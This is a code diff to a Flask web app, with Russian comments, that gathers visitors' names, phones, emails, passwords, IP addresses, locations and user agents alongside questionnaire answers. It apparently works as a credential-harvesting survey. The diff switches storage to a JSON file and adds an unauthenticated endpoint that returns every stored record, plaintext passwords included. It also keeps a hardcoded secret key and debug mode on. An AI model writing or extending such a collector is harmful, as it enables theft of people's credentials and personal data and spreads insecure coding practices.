@@ -1,20 +1,27 @@
-from flask import Flask, request, render_template, redirect, url_for, session
+from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 import requests
 import os
+import json
 
 app = Flask(__name__)
-app.secret_key = 'very_secret_key'  # для хранения сессии
+app.secret_key = 'very_secret_key'
 
-LOG_FILE = 'log.txt'
+RESPONSES_FILE = 'responses.json'
 
 def save_response(data):
-    with open(LOG_FILE, 'a', encoding='utf-8') as f:
-        f.write(
-            f"Имя: {data['name']} | Телефон: {data['phone']} | Email: {data['email']} | Пароль: {data['password']} | "
-            f"Ответы: {data['answers']} | IP: {data['ip']} | Город: {data['location']['city']} | "
-            f"Страна: {data['location']['country']} | User-Agent: {data['user_agent']}\n"
-        )
-    print("[✔] Данные сохранены в log.txt")
+    if os.path.exists(RESPONSES_FILE):
+        with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
+            try:
+                responses = json.load(f)
+            except json.JSONDecodeError:
+                responses = []
+    else:
+        responses = []
+
+    responses.append(data)
+
+    with open(RESPONSES_FILE, 'w', encoding='utf-8') as f:
+        json.dump(responses, f, ensure_ascii=False, indent=4)
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -71,6 +78,17 @@ def questions():
         return render_template('success.html', name=session['name'], answers=answers, geo=geo, ip=ip, ua=ua)
 
     return render_template('questions.html')
+
+@app.route('/get-responses', methods=['GET'])
+def get_responses():
+    if os.path.exists(RESPONSES_FILE):
+        with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
+            try:
+                data = json.load(f)
+            except json.JSONDecodeError:
+                data = []
+        return jsonify(data)
+    return jsonify([])
 
 if __name__ == '__main__':
     app.run(debug=True)
